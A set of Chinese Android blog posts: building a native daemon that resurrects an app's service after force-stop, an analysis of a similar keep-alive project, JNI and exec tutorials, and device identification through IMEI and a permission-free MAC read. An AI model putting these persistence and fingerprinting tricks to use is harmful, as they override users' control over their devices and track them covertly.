0) &#123; // 父进程 // 关闭pipe1的写端 close(pipe1Fd[1]); // 关闭pipe2的读端 close(pipe2Fd[0]); // 监听子进程情况 char readBuffer[100]; int readResult = read(pipe1Fd[0], readBuffer, 100); LOGD(MY_NATIVE_TAG, \"readResult is %d, errno is %d\", readResult, errno); // 阻塞中断，子进程已退出 LOGD(MY_NATIVE_TAG, \"child process is dead\"); // 释放Java参数内存 env-&gt;ReleaseStringUTFChars(jPackageName, packageName); env-&gt;ReleaseStringUTFChars(jWakeUpClassName, wakeUpClassName); env-&gt;ReleaseStringUTFChars(jBinaryFilePath, binaryFilePath); // 拉活处理，回调Java方法 jmethodID methodID = env-&gt;GetStaticMethodID(clazz, \"onDaemonDead\", \"()V\"); env-&gt;CallStaticVoidMethod(clazz, methodID, NULL); return; &#125; else if (result == 0) &#123; // 子进程 // 管道描述符转为字符串 char strP1r[10]; char strP1w[10]; char strP2r[10]; char strP2w[10]; sprintf(strP1r, \"%d\", pipe1Fd[0]); sprintf(strP1w, \"%d\", pipe1Fd[1]); sprintf(strP2r, \"%d\", pipe2Fd[0]); sprintf(strP2w, \"%d\", pipe2Fd[1]); // 执行二进制文件 LOGD(MY_NATIVE_TAG, \"execute binary file\"); LOGD(MY_NATIVE_TAG, \"binary file argv ：%s %s %s %s %s %s %s %s %s %s %s %s %s\", BINARY_FILE_NAME, PACKAGE_NAME, packageName, SERVICE_CLASS_NAME, wakeUpClassName, PIPE_1_READ, strP1r, PIPE_1_WRITE, strP1w, PIPE_2_READ, strP2r, PIPE_2_WRITE, strP2w); execlp(binaryFilePath, BINARY_FILE_NAME, PACKAGE_NAME, packageName, SERVICE_CLASS_NAME, wakeUpClassName, PIPE_1_READ, strP1r, PIPE_1_WRITE, strP1w, PIPE_2_READ, strP2r, PIPE_2_WRITE, strP2w, NULL); // 函数返回，执行失败 LOGE(MY_NATIVE_TAG, \"execute binary file fail, errno is %d\", errno); &#125; else &#123; LOGE(MY_NATIVE_TAG, \"fork fail!\"); &#125; // 释放Java参数内存 env-&gt;ReleaseStringUTFChars(jPackageName, packageName); env-&gt;ReleaseStringUTFChars(jWakeUpClassName, wakeUpClassName); env-&gt;ReleaseStringUTFChars(jBinaryFilePath, binaryFilePath);&#125; 在start方法中，我们首先获取了从Java层传过来的参数，然后通过pipe函数开启了两条匿名管道用于服务进程与其后代守护进程监听存活情况： pipe1：管道1，用于父进程监听子进程的存活情况，父进程关闭pipe1的写端，子进程关闭pipe1的读端 pipe2：管道2，用于子进程监听父进程的存活情况，父进程关闭pipe2的读端，子进程关闭pipe2的写端 然后通过fork创建相应的子进程，在父进程中通过管道监听子进程的状况，在子进程中通过exec函数执行二进制文件重生为守护进程。 当父进程管道读取返回时，代表子进程已被销毁。此时，父进程通过回调Java层的onDeamonDead方法唤醒拉活进程并自杀等待重启： 1234567public static void onDaemonDead() &#123; Log.d(TAG, \"call onDaemonDead!\"); // 闹钟启动拉活进程 alarmManager.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 5000, wakeUpIntent); // 自杀 Process.killProcess(Process.myPid());&#125; 二进制文件代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384int main(int argc, char *argv[]) &#123; // 参数个数检查 if (argc &lt; 13) &#123; LOGE(MY_NATIVE_TAG, \"argc number is %d, expected 13!\", argc); return 0; &#125; char *processName = argv[0]; char *packageName = NULL; char *wakeUpClassName = NULL; int pipe1Fd[2]; int pipe2Fd[2]; for (int i = 0; i &lt; argc; i++) &#123; if (!strcmp(PACKAGE_NAME, argv[i])) &#123; packageName = argv[i + 1]; LOGD(MY_NATIVE_TAG, \"packageName is : %s\", packageName); &#125; if (!strcmp(SERVICE_CLASS_NAME, argv[i])) &#123; wakeUpClassName = argv[i + 1]; LOGD(MY_NATIVE_TAG, \"wakeUpClassName is : %s\", wakeUpClassName); &#125; if (!strcmp(PIPE_1_READ, argv[i])) &#123; pipe1Fd[0] = atoi(argv[i + 1]); LOGD(MY_NATIVE_TAG, \"pipe1r is : %d\", pipe1Fd[0]); &#125; if (!strcmp(PIPE_1_WRITE, argv[i])) &#123; pipe1Fd[1] = atoi(argv[i + 1]); LOGD(MY_NATIVE_TAG, \"pipe1w is : %d\", pipe1Fd[1]); &#125; if (!strcmp(PIPE_2_READ, argv[i])) &#123; pipe2Fd[0] = atoi(argv[i + 1]); LOGD(MY_NATIVE_TAG, \"pipe2r is : %d\", pipe2Fd[0]); &#125; if (!strcmp(PIPE_2_WRITE, argv[i])) &#123; pipe2Fd[1] = atoi(argv[i + 1]); LOGD(MY_NATIVE_TAG, \"pipe2w is : %d\", pipe2Fd[1]); &#125; &#125; // 成为守护进程 int forkResult = fork(); if (forkResult == 0) &#123; // 成为会话组长 setsid(); // 改变工作目录 chdir(\"/\"); // 清理僵尸进程 cleanZombieProcess(processName); // 管道处理 // 关闭pipe1的读端 close(pipe1Fd[0]); // 关闭pipe2的写端 close(pipe2Fd[1]); // 管道监听，监听父进程情况 char readBuffer[100]; int readResult = read(pipe2Fd[0], readBuffer, 100); LOGD(MY_NATIVE_TAG, \"readResult is %d, errno is %d\", readResult, errno); // 阻塞中断，父进程已退出 LOGD(MY_NATIVE_TAG, \"parent process is dead\"); // 拉活处理 pid_t childPid = fork(); if (childPid == 0) &#123; // 唤醒广播拉活 char *wakeUpName = new char[strlen(packageName) + strlen(wakeUpClassName) + 1]; sprintf(wakeUpName, \"%s/.%s\", packageName, wakeUpClassName); LOGD(MY_NATIVE_TAG, \"wakeUpName is %s\", wakeUpName); int result = execlp(\"am\", \"am\", \"broadcast\", \"--user\", \"0\", \"-n\", wakeUpName, (char *) NULL); LOGD(MY_NATIVE_TAG, \"execute am broadcast result is %d\", result); &#125; else if (childPid &gt; 0) &#123; waitpid(childPid, NULL, 0); LOGD(MY_NATIVE_TAG, \"execute am broadcast over\"); &#125; else &#123; LOGE(MY_NATIVE_TAG, \"fork fail!\"); &#125; return 0; &#125; else if (forkResult &gt; 0) &#123; return 0; &#125; else &#123; LOGE(MY_NATIVE_TAG, \"fork fail!\"); &#125;&#125; 在二进制文件中，首先检查了传入的参数，然后使该进程成为Linux的守护进程（没有关闭标准输入输出错误、关闭后执行am指令会出问题），并清理了以前剩下的僵尸守护进程，然后通过管道监听父进程的存活情况，当父进程死亡时，通过exec函数执行am指令发送广播唤醒拉活进程，并退出程序关闭守护进程。 负责拉活进程的广播接收器如下： 123456789101112public class WakeUpBroadcastReceiver extends BroadcastReceiver &#123; private static final String TAG = \"MyLog\"; @Override public void onReceive(Context context, Intent intent) &#123; // 拉活处理 Log.d(TAG, \"Receiver Start Service\"); Intent serviceIntent = new Intent(context, PersistService.class); context.startService(serviceIntent); &#125;&#125; 下面是在Android 4.3 CoolPad手机上测试的效果：首次启动： 在adb shell中通过force-stop关闭服务进程： 守护进程检测到Service进程被杀死，进行拉活处理： 此次守护进程的pid为21561，我们尝试通过kill命令杀死守护进程 Service进程检测到守护进程被杀死，进行拉活处理： 通过测试发现，无论是Service进程死亡还是守护进程死亡，另一方都能通过唤醒拉活进程将其救活，真正实现了Native层的双进程守护功能。 然而，在Android 5.0以上版本该方法并没有效果……目前博主正在进行进一步的学习研究。 项目git地址：https://github.com/superxlcr/MyNativeTest","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"cpp","slug":"cpp","permalink":"https://superxlcr.github.io/tags/cpp/"}]},{"title":"JNI 方法注册与签名","slug":"JNI-方法注册与签名","date":"2017-05-25T09:09:13.000Z","updated":"2020-05-11T07:23:44.703Z","comments":true,"path":"2017/05/25/JNI-方法注册与签名/","link":"","permalink":"https://superxlcr.github.io/2017/05/25/JNI-方法注册与签名/","excerpt":"","text":"最近了解了关于Java JNI接口的一些关于方法注册与签名相关的知识，在此进行一下总结。使用JNI接口时，我们首先需要把Java方法声明为native： 1public native void f(); 然后编写对应的C/C++代码，并编译成为动态链接库（.dll或.so），在调用Java方法前载入动态链接库即可调用： 123static &#123; System.loadLibrary(\"native-lib\");&#125; 那么，Java文件中的native方法是如何与native文件中的方法一一对应的呢？在此有两种方法：静态注册与动态注册，下面将一一介绍： 静态注册采用静态注册时，Java层的native方法与native层的方法在名称上具有一一对应的关系，具体要求如下：native层的方法名为：Java_&lt;包名&gt;&lt;类名&gt;&lt;方法名&gt;（__&lt;参数&gt;） 其中，包名使用下划线代替点号进行分割只有当native方法出现需要重载的时候，native层的方法名后才需要跟上参数（括号里的内容），参数的编写形式与JNI签名相关（后面会介绍）通常而言，我们可以把native方法集中在一个类中，然后调用： 1javah -jni 包名.类名 自动生成对应的c层头文件下面是静态注册的例子：Java层： 1234567891011121314151617package com.app.superxlcr.jnitest;/** * Created by superxlcr on 2017/5/25. */public class NativeTest &#123; public native void f(); public native int f(int a, double b); public native void f(Object a, String b); public native void g();&#125; native层： 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* DO NOT EDIT THIS FILE - it is machine generated */#include &lt;jni.h&gt;/* Header for class com_app_superxlcr_jnitest_NativeTest */#ifndef _Included_com_app_superxlcr_jnitest_NativeTest#define _Included_com_app_superxlcr_jnitest_NativeTest#ifdef __cplusplusextern \"C\" &#123;#endif/* * Class: com_app_superxlcr_jnitest_NativeTest * Method: f * Signature: ()V */JNIEXPORT void JNICALL Java_com_app_superxlcr_jnitest_NativeTest_f__ (JNIEnv *, jobject);/* * Class: com_app_superxlcr_jnitest_NativeTest * Method: f * Signature: (ID)I */JNIEXPORT jint JNICALL Java_com_app_superxlcr_jnitest_NativeTest_f__ID (JNIEnv *, jobject, jint, jdouble);/* * Class: com_app_superxlcr_jnitest_NativeTest * Method: f * Signature: (Ljava/lang/Object;Ljava/lang/String;)V */JNIEXPORT void JNICALL Java_com_app_superxlcr_jnitest_NativeTest_f__Ljava_lang_Object_2Ljava_lang_String_2 (JNIEnv *, jobject, jobject, jstring);/* * Class: com_app_superxlcr_jnitest_NativeTest * Method: g * Signature: ()V */JNIEXPORT void JNICALL Java_com_app_superxlcr_jnitest_NativeTest_g (JNIEnv *, jobject);#ifdef __cplusplus&#125;#endif#endif 我们可以看到，对于拥有重载的f 方法，其native方法名称后都带有参数，而没有重载的g 方法则没带有静态注册JNI方法的弊端非常明显，就是方法名会变得很长，因此下面我们介绍另外一种动态注册的方法 动态注册使用动态注册时，我们需要准备好需要自己想要对应的native方法，然后构造JNINativeMethod数组，JNINativeMethod是一种结构体，源码如下： 12345678typedef struct &#123; // Java层native方法名称 const char* name; // 方法签名 const char* signature; // native层方法指针 void* fnPtr;&#125; JNINativeMethod; 然后重写JNI_OnLoad方法（该方法会在Java层通过System.loadLibrary加载完动态链接库后被调用），我们在其中进行动态注册工作： 123456789101112131415161718192021222324252627JNIEXPORT jint JNICALLJNI_OnLoad(JavaVM* vm, void* reserved) &#123; JNIEnv *env = NULL; jint result = -1; // 获取JNI env变量 if (vm-&gt;GetEnv((void**) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123; // 失败返回-1 return result; &#125; // 获取native方法所在类 const char* className = \"com/app/superxlcr/jnitest/MainActivity\"; jclass clazz = env-&gt;FindClass(className); if (clazz == NULL) &#123; return result; &#125; // 动态注册native方法 if (env-&gt;RegisterNatives(clazz, methods, 1) &lt; 0) &#123; return result; &#125; // 返回成功 result = JNI_VERSION_1_4; return result;&#125; 动态注册的大致步骤如下： 通过vm（Java虚拟机）参数获取JNIEnv变量 通过FindClass方法找到对应的Java类 通过RegisterNatives方法，传入JNINativeMethod数组，注册native函数 对于JNINativeMethod结构而言，签名是其非常重要的一项元素，它用于区分Java中native方法的各种重载形式，下面将介绍方法的签名 方法签名方法签名对于区分Java层native重载方法有重大意义总的来说，方法签名的组成规则为： 1(参数类型标识1参数类型标识2...参数类型标识n)返回值类型标识 类型标识对应关系如下： 类型标识 Java类型 Z boolean B byte C char S short I int J long F float D double L包名/类名; 各种引用类型 V void 另外，当Java类型为数组时，在标识前会有“[”符号，例如：String[] 类型标识为 [Ljava/lang/String; 下面举几个例子： 1234567891011// Signature: ()Vpublic native void f();// Signature: (ID)Ipublic native int f(int a, double b);// Signature: (Ljava/lang/Object;Ljava/lang/String;)Vpublic native void f(Object a, String b);// Signature: ()Vpublic native void g();","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://superxlcr.github.io/tags/cpp/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"exec函数族小结","slug":"exec函数族小结","date":"2017-05-13T09:27:40.000Z","updated":"2020-05-11T07:23:44.770Z","comments":true,"path":"2017/05/13/exec函数族小结/","link":"","permalink":"https://superxlcr.github.io/2017/05/13/exec函数族小结/","excerpt":"","text":"本人最近了解了关于exec函数族相关的知识，在此进行一下总结。 exec函数族说明fork函数是用于创建一个子进程，该子进程几乎是父进程的副本。而当我们希望子进程去执行另外的程序时，exec函数族就提供了一个在进程中启动另一个程序执行的方法。它可以根据指定的文件名或目录名找到可执行文件（这里的可执行文件既可以是二进制文件，也可以是Linux下任何可执行脚本文件），并用它来取代原调用进程的数据段、代码段和堆栈段，在执行完之后，原调用进程的内容除了进程号外，其他全部被新程序的内容替换了。 exec函数族使用情况一般而言，在Linux中使用exec函数族主要有以下两种情况： 进程认为自己不能再为系统和用户做出任何贡献时，就可以调用任何exec 函数族让自己重生 一个进程想执行另一个程序，它可以调用fork函数新建一个进程，然后调用任何一个exec函数使子进程重生 exec函数族语法介绍exec函数族中并没有exec函数，但有6个以exec开头的成员函数，它们所需的头文件均为&lt;unistd.h&gt;，原型如下： 123456int execl(const char *path, const char *arg, ...)int execv(const char *path, char *const argv[])int execle(const char *path, const char *arg, ..., char *const envp[])int execve(const char *path, char *const argv[], char *const envp[])int execlp(const char *file, const char *arg, ...)int execvp(const char *file, char *const argv[]) 函数的返回值为int类型，一般而言有两种情况： 当文件执行成功时，函数不会返回任何东西 当文件执行失败时，函数会返回-1，并且失败原因会记录在errno中（&lt;errno.h&gt;头文件中，一个表示错误类型的int） 这六个函数在函数名和使用语法的规则上都有细微的区别，下面就可执行文件查找方式、参数表传递方式及环境变量这三个方面进行比较说明。 查找方式exec函数族中前四个函数（execl、execv、execle、execve）的查找方式都是完整的文件目录路径，而最后2个函数（也就是以p结尾的两个函数）可以只给出文件名，系统就会自动从环境变量“$PATH”所指出的路径中进行查找 参数传递方式exec函数族的参数传递有两种方式，以函数名的第5位字母来区分： 字母为“l”（list）的表示逐个列举的方式，最后一个指针要求是NULL 字母为“v”（vector）的表示将所有参数整体构造成指针数组传递，然后将该数组的首地址当做参数传给它，数组中的最后一个指针也要求是NULL 环境变量exec函数族使用了系统默认的环境变量，也可以传入指定的环境变量。这里以“e”（environment）结尾的两个函数execle、execve就可以在envp[]中指定当前进程所使用的环境变量替换掉该进程继承的所有环境变量。 总的来说，exec函数族命名关系可以归结为：前四位：统一为exec第五位： l：表示通过逐个列举的方式传入参数（execl、execle、execlp） v：表示通过构造指针数组的方式传入参数（execv、execve、execvp） 第六位： e：可传递新进程环境变量（execle、execve） p：可执行文件查找方式为文件名（execlp、execvp） exec函数族调用举例12345678910111213141516// 参数指针数组，以NULL结尾char *const ps_argv[] =&#123;\"ps\", \"-o\", \"pid,ppid,pgrp,session,tpgid,comm\", NULL&#125;;// 环境变量char *const ps_envp[] =&#123;\"PATH=/bin:/usr/bin\", \"TERM=console\", NULL&#125;;// 使用文件路径查找execl(\"/bin/ps\", \"ps\", \"-o\", \"pid,ppid,pgrp,session,tpgid,comm\", NULL);execv(\"/bin/ps\", ps_argv);// 使用文件路径查找，指定新的环境变量execle(\"/bin/ps\", \"ps\", \"-o\", \"pid,ppid,pgrp,session,tpgid,comm\", NULL, ps_envp);execve(\"/bin/ps\", ps_argv, ps_envp);// 使用文件名查找execlp(\"ps\", \"ps\", \"-o\", \"pid,ppid,pgrp,session,tpgid,comm\", NULL);execvp(\"ps\", ps_argv);","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://superxlcr.github.io/tags/cpp/"},{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"},{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"}]},{"title":"Android Native进程保活工程解析","slug":"Android-Native进程保活工程解析","date":"2017-05-09T04:29:44.000Z","updated":"2020-05-11T07:23:44.507Z","comments":true,"path":"2017/05/09/Android-Native进程保活工程解析/","link":"","permalink":"https://superxlcr.github.io/2017/05/09/Android-Native进程保活工程解析/","excerpt":"","text":"最近学习了一个关于Android Native进程保活的工程，在此进行一下总结。 工程github如下：https://github.com/Coolerfall/Android-AppDaemon 其总体的保活工作流程如图所示： 其工作流程如下：首先，用户调用Daemon的静态方法run，传入上下文、Service组件类名、以及检查等待的时间间隔： 123456789/** * Run daemon process. * * @param context context * @param daemonServiceClazz the name of daemon service class * @param interval the interval to check */public static void run(final Context context, final Class&lt;?&gt; daemonServiceClazz, final int interval) 工程通过android.os.Build.CPU_ABI获取设备的CPU架构，选择对应的二进制文件，通过AssetManager访问文件后，复制到指定位置，使用chmod指令改变文件权限为0755： 1Runtime.getRuntime().exec(\"chmod \" + mode + \" \" + abspath).waitFor(); asset文件目录如下： 通过shell执行二进制文件，传入包名、类名与时间间隔： 123456789101112131415161718String cmd = context.getDir(BIN_DIR_NAME, Context.MODE_PRIVATE) .getAbsolutePath() + File.separator + DAEMON_BIN_NAME;/* create the command string */StringBuilder cmdBuilder = new StringBuilder();cmdBuilder.append(cmd);cmdBuilder.append(\" -p \");cmdBuilder.append(context.getPackageName());cmdBuilder.append(\" -s \");cmdBuilder.append(daemonClazzName.getName());cmdBuilder.append(\" -t \");cmdBuilder.append(interval);try &#123; Runtime.getRuntime().exec(cmdBuilder.toString()).waitFor();&#125; catch (IOException | InterruptedException e) &#123; Log.e(TAG, \"start daemon error: \" + e.getMessage());&#125; 在二进制文件中，首先检查了传入的参数是否正确： 12345678910111213141516171819202122232425262728293031323334if (argc &lt; 7)&#123; LOGE(LOG_TAG, \"usage: %s -p package-name -s \" \"daemon-service-name -t interval-time\", argv[0]); return;&#125;for (i = 0; i &lt; argc; i ++)&#123; if (!strcmp(\"-p\", argv[i])) &#123; package_name = argv[i + 1]; LOGD(LOG_TAG, \"package name: %s\", package_name); &#125; if (!strcmp(\"-s\", argv[i])) &#123; service_name = argv[i + 1]; LOGD(LOG_TAG, \"service name: %s\", service_name); &#125; if (!strcmp(\"-t\", argv[i])) &#123; interval = atoi(argv[i + 1]); LOGD(LOG_TAG, \"interval: %d\", interval); &#125;&#125;/* package name and service name should not be null */if (package_name == NULL || service_name == NULL)&#123; LOGE(LOG_TAG, \"package name or service name is null\"); return;&#125; 保证传入参数个数正确，包名类名不为空后，开始创建守护进程： 12345678910111213141516171819202122232425if ((pid = fork()) &lt; 0)&#123; exit(EXIT_SUCCESS);&#125;else if (pid == 0)&#123; ... /* become session leader */ setsid(); /* change work directory */ chdir(\"/\"); for (i = 0; i &lt; MAXFILE; i ++) &#123; close(i); &#125; ...&#125;else&#123; /* parent process */ exit(EXIT_SUCCESS);&#125; 创建守护进程的流程如下：（此处的方法感觉有点欠缺，具体的可以去查看博客：http://blog.chinaunix.net/uid-25365622-id-3055635.html） 调用fork函数，创建子进程 使进程在后台运行，关闭父进程 调用setsid函数，脱离控制终端，登录会话和进程组（创建新会话） 调用chdir函数，改变当前工作目录至根目录 调用close函数，关闭从父进程继承的文件描述符，一般而言由于没有了输入终端，因此可以关闭标准输入、输出、错误文件（即0、1和2三个文件） 当工程成功创建守护进程后，开始调用signal函数处理信号： 12345678910111213// 标识select等待循环是否运行的flagvolatile int sig_running = 1;// 传入signal的函数，参数为int类型/* signal term handler */static void sigterm_handler(int signo)&#123; LOGD(LOG_TAG, \"handle signal: %d \", signo); sig_running = 0;&#125; // 处理SIGTERM信号，当进程被杀死时会收到该信号signal(SIGTERM, sigterm_handler); 接着，守护进程处理以前开启的守护进程： 12345678910111213141516171819202122int pid_list[100];// find_pid_by_name为工程定义的，通过进程的cmdline文件查找进程的函数int total_num = find_pid_by_name(argv[0], pid_list);LOGD(LOG_TAG, \"total num %d\", total_num);for (i = 0; i &lt; total_num; i ++)&#123; int retval = 0; int daemon_pid = pid_list[i]; if (daemon_pid &gt; 1 &amp;&amp; daemon_pid != getpid()) &#123; retval = kill(daemon_pid, SIGTERM); if (!retval) &#123; LOGD(LOG_TAG, \"kill daemon process success: %d\", daemon_pid); &#125; else &#123; LOGD(LOG_TAG, \"kill daemon process %d fail: %s\", daemon_pid, strerror(errno)); exit(EXIT_SUCCESS); &#125; &#125;&#125; 最后，利用循环轮询的方式来唤醒服务组件： 1234567891011121314151617181920212223 while(sig_running) &#123; interval = interval &lt; SLEEP_INTERVAL ? SLEEP_INTERVAL : interval; select_sleep(interval, 0); LOGD(LOG_TAG, \"check the service once, interval: %d\", interval); /* start service */ start_service(package_name, service_name); &#125; /** * Use `select` to sleep with specidied second and microsecond. */void select_sleep(long sec, long msec)&#123; struct timeval timeout; timeout.tv_sec = sec; timeout.tv_usec = msec * 1000; select(0, NULL, NULL, NULL, &amp;timeout);&#125; 唤醒组件的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243/* start daemon service */static void start_service(char *package_name, char *service_name)&#123; /* get the sdk version */ int version = get_version(); pid_t pid; if ((pid = fork()) &lt; 0) &#123; exit(EXIT_SUCCESS); &#125; else if (pid == 0) &#123; if (package_name == NULL || service_name == NULL) &#123; LOGE(LOG_TAG, \"package name or service name is null\"); return; &#125; char *p_name = str_stitching(package_name, \"/\"); char *s_name = str_stitching(p_name, service_name); LOGD(LOG_TAG, \"service: %s\", s_name); if (version &gt;= 17 || version == 0) &#123; int ret = execlp(\"am\", \"am\", \"startservice\", \"--user\", \"0\", \"-n\", s_name, (char *) NULL); LOGD(LOG_TAG, \"result %d\", ret); &#125; else &#123; execlp(\"am\", \"am\", \"startservice\", \"-n\", s_name, (char *) NULL); &#125; LOGD(LOG_TAG , \"exit start-service child process\"); exit(EXIT_SUCCESS); &#125; else &#123; waitpid(pid, NULL, 0); &#125;&#125; 在上述代码中，守护进程fork了一个子进程，然后在子进程中通过am的startservice命令，加上我们传入的包名与类名来启动对应的服务组件，启动完成后退出子进程。 因此，为了让服务可被外部调用，该工程要求我们设置Service组件的exported属性： 12345&lt;service android:name=\"com.coolerfall.service.DaemonService\" android:process=\":daemon\" android:exported=\"true\" &gt;&lt;/service&gt; 总的来说，个人认为该工程还有以下待改进的地方： 该工程使用的是轮询的方法来定期给Service发送intent，资源消耗较大 Android 5.0以上的系统在清理进程时，会把c进程一同清理掉 其守护方式是单向的，如果c进程挂掉了，将无法守护Service组件 根据源码，其每次开启守护进程时都会清除旧的守护进程，无法同时守护两个Service组件","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"cpp","slug":"cpp","permalink":"https://superxlcr.github.io/tags/cpp/"}]},{"title":"Android NDK初次学习","slug":"Android-NDK初次学习","date":"2017-05-05T07:26:21.000Z","updated":"2020-05-11T07:23:44.503Z","comments":true,"path":"2017/05/05/Android-NDK初次学习/","link":"","permalink":"https://superxlcr.github.io/2017/05/05/Android-NDK初次学习/","excerpt":"","text":"最近博主开始学习如何使用NDK，在此进行一下总结。 博主的IDE为Android Studio 2.3.1，接下来博主将演示如何在现有的项目上支持NDK。 下载NDK首先，使用SDK Manager下载SDK Tools调试工具LLDB、编译工具CMake以及NDK： NDK也可以去官网进行下载：NDK下载地址 编写java文件首先，我们编写一个Native工具类，里面定义了一个native方法获取字符串： 12345public class NativeUtils &#123; public static native String getNativeString(String str); &#125; 然后在我们的主界面打印这个字符串： 12345678910public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TextView tv = (TextView) findViewById(R.id.tv); tv.setText(NativeUtils.getNativeString(\"Java world\")); &#125;&#125; 接着我们在app根目录下创建一个jni文件夹： 创建完成后，我们多了一个cpp的文件夹（实际上是jni文件夹，Android视图进行了简化）： 然后我们Make Project，使其Java代码生成.class文件，并打开终端： 定位到生成.class文件的目录下： 1cd app\\build\\intermediates\\classes\\debug 使用java命令的jni框架生成.h文件： 1javah -jni 完整包名.类名 然后使用project 视图找到我们的.h文件： 把生成的.h文件剪贴到我们的jni文件夹中新建的include目录下： 链接到Gradle首先我们需要在工程的Project Structure 下设置NDK 的目录： 在local.properties文件中添加ndk.dir属性亦可达到同样效果： 然后我们在cpp文件夹下创建空白的NativeUtils.cpp文件 接着打开Project视图，在工程的根目录下新建CMakeLists.txt 文件： 1234567891011121314151617181920212223242526# Sets the minimum version of CMake required to build your native library.# This ensures that a certain set of CMake features is available to# your build.cmake_minimum_required(VERSION 3.4.1)# Specifies a library name, specifies whether the library is STATIC or# SHARED, and provides relative paths to the source code. You can# define multiple libraries by adding multiple add.library() commands,# and CMake builds them for you. When you build your app, Gradle# automatically packages shared libraries with your APK.add_library( # Specifies the name of the library. # so动态链接库文件名 NativeUtils # Sets the library as a shared library. SHARED # Provides a relative path to your source file(s). # cpp文件名 app/src/main/jni/NativeUtils.cpp )# Specifies a path to native header files.# .h头文件位置include_directories(app/src/main/jni/) 在Android视图中，选择我们的cpp文件夹，选择链接到Gradle： 选择CMake编译系统，并选择我们的CMakeLists.txt： 我们也可以通过在app模块的build.gradle的android的属性添加一下代码达到相同的效果： 12345externalNativeBuild &#123; cmake &#123; path &apos;../CMakeLists.txt&apos; &#125;&#125; 进行Gradle sync 同步过后，我们可以开始进行cpp代码编写了。 编写cpp文件首先我们编写NativeUtils.cpp 文件，实现具体的Native方法： 1234567891011121314151617181920212223#include &lt;iostream&gt;#include \"com_app_superxlcr_myndktest_NativeUtils.h\"using namespace std;/* * Class: com_app_superxlcr_myndktest_NativeUtils * Method: getNativeString * Signature: (Ljava/lang/String;)Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_com_app_superxlcr_myndktest_NativeUtils_getNativeString (JNIEnv * env, jclass clz, jstring str) &#123; // 获取Java层传来的字符串 jboolean* isCopy; const char* nativeChars = env-&gt;GetStringUTFChars(str, isCopy); // 构造返回字符串 string nativeStr = \"Native world get Message :\"; nativeStr.append(nativeChars); // 释放Java字符串资源 env-&gt;ReleaseStringUTFChars(str, nativeChars); // 返回结果 return env-&gt;NewStringUTF(nativeStr.c_str()); &#125; 然后我们在NativeUtils.java 文件中添加如下代码载入动态链接库： 123static &#123; System.loadLibrary(\"NativeUtils\");&#125; 编译运行的效果如下： 更多关于NDK的信息请参考官方的链接：https://developer.android.com/ndk/index.html#Revisions","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"cpp","slug":"cpp","permalink":"https://superxlcr.github.io/tags/cpp/"}]},{"title":"Android 手机识别","slug":"Android-手机识别","date":"2017-05-03T04:18:55.000Z","updated":"2020-05-11T07:23:44.534Z","comments":true,"path":"2017/05/03/Android-手机识别/","link":"","permalink":"https://superxlcr.github.io/2017/05/03/Android-手机识别/","excerpt":"","text":"最近博主学习了如何通过某些技术来识别不同的Android手机，在此进行一番总结。 使用DeviceIddeviceId为Android提供的用于手机识别的识别码，其获取代码如下： 12TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);Log.d(\"MyLog\", telephonyManager.getDeviceId()); 打印Log如下： getDeviceId方法的文档如下：该方法会根据手机的类型为GSM（Global System for Mobile Communication，全球移动通信系统）或CDMA（Code Division Multiple Access，码分多址），返回对应的IMEI（International Mobile Equipment Identity，国际移动设备身份码）、MEID（Mobile Equipment Identifier，移动设备识别码）或ESN码（Electronic Serial Number，电子序列号）。 但该方法获取的deviceId也有一定的缺陷： 非手机的Android设备没有deviceId 获取deviceId需要READ_PHONE_STATE权限 在少数手机上该方法存在bug 使用MAC地址MAC地址即 Media Access Control或者Medium Access Control 地址，意译为媒体访问控制，或称为物理地址、硬件地址，用来定义网络设备的位置。一般而言，每个主机都会有其自己的MAC地址，因此我们可以通过MAC地址来识别一台Android手机。以下为获取MAC地址例子：方法一，使用WifiManager，这种方法需要 ACESS_WIFI_STATE 权限： 1234567String macAddress = null;WifiManager wifiManager = (WifiManager)getApplicationContext().getSystemService(Context.WIFI_SERVICE);WifiInfo info = (null == wifiManager ? null : wifiManager.getConnectionInfo());if (null != info) &#123; macAddress = info.getMacAddress();&#125;Log.d(\"MyLog\", macAddress); 值得注意的是，据说在Android 6.0以上版本中，该方法会不再适用，获取的MAC都会变为 02:00:00:00:00:00 默认值。 方法二，使用cmd命令直接访问网卡MAC地址： 12345678910111213141516String macSerial = \"\";try &#123; Process pp = Runtime.getRuntime().exec( \"cat /sys/class/net/wlan0/address\"); InputStreamReader ir = new InputStreamReader(pp.getInputStream()); LineNumberReader input = new LineNumberReader(ir); String line; while ((line = input.readLine()) != null) &#123; macSerial += line.trim(); &#125; input.close();&#125; catch (IOException e) &#123; e.printStackTrace();&#125;Log.d(\"MyLog\", macSerial); 这种方法不需要任何权限即可获取MAC地址，不过当手机未连接wifi时，无法获取MAC地址。 通过MAC地址来识别我们的手机具有一定的可行性，但这种方法仍存在一定的缺陷： 不是所有设备都具有网卡或者蓝牙 